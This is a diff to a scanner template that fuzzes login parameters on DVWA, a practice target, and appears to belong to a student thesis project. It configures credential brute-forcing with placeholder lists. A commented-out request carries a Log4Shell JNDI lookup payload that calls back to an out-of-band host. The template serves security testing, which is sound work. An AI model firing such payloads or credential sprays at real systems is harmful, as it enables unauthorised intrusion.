@@ -21,9 +21,11 @@ info:
 requests:
   - request:
       - |
-        GET /dvwa?user={{users}}&pass={{passwords}} HTTP/1.1
+        GET /dvwa?username={{users}}&passwd={{passwords}}&email={{emails}} HTTP/1.1
         Host: {{Hostname}}
-        User-Agent: {{users}}{{passwords}}
+        User-Agent: {{users}}{{passwords}}&email={{emails}}
+
+        username={{users}}{{Port}}&passwd={{passwords}}&email={{emails}}
 #      - |
 #        GET /?x=${jndi:ldap://${hostName}.uri.{{interactsh-url}}/a} HTTP/1.1
 #        Host: {{Hostname}}
@@ -51,18 +53,17 @@ requests:
 #        Content-Type: application/json
 #
 #        {"result": [{"id": 2, "name": "US", "flag{{passwords}}": "sf{{Hostname}}"}]}
-      - |
-         POST /abc/xxx/index.php HTTP/1.1
-         Host: {{Hostname}}
-         User-Agent: Chrome {{Hostname}}
-         {{Scheme}}: {{Host}}:{{Port}} hihi {{Path}} haha {{Hostname}}
-         Accept-Encoding: gzip, deflate
-         Accept: */*
-         Connection: close
-         Content-Type: application/x-www-form-urlencoded
-
-         username={{users}}{{Port}}&passwd={{passwords}}
-
+#      - |
+#         POST /abc/xxx/index.php?user={{users}}&passwd={{passwords}} HTTP/1.1
+#         Host: {{Hostname}}
+#         User-Agent: Chrome {{Hostname}}
+#         TestInjection: {{users}},{{passwords}}
+#         Accept-Encoding: gzip, deflate
+#         Accept: */*
+#         Connection: close
+#         Content-Type: application/x-www-form-urlencoded
+#
+#         username={{users}}{{Port}}&passwd={{passwords}}
     payloads:
 #      users: D:\FPT LEARNING\Graduation Thesis\Scanner\Injection-Tool\template\fuzzing\users.txt
 #      passwords: D:\FPT LEARNING\Graduation Thesis\Scanner\Injection-Tool\template\fuzzing\passwords.txt
@@ -71,20 +72,23 @@ requests:
       users:
         - user1
         - user2
-        - user3
-        - user4
+#        - user3
+#        - user4
       passwords:
         - pass1
         - pass2
-        - pass3
-        - pass4
+#        - pass3
+#        - pass4
+      emails:
+        - email1
+        - email2
 #      Hostname: D:\FPT LEARNING\Graduation Thesis\Scanner\Injection-Tool\template\fuzzing\users.txt
 #      Scheme: D:\FPT LEARNING\Graduation Thesis\Scanner\Injection-Tool\template\fuzzing\passwords.txt
     redirect: true
     thread: 20
-    scanMode: pitchfork
+    scanMode: clusterbomb
     stopAtFirstMatch: true
-    matchersCondition: or
+    matchersCondition: and
     cookieReuse: true
     requestCondition: false
     matchers:
@@ -107,6 +111,7 @@ requests:
       - type: word
         word:
 #          - dns
+          - "Document-Policy: force-load-at-top"
           - <div id="main_menu_padded">
           - The requested URL was not found on this server
         part: all
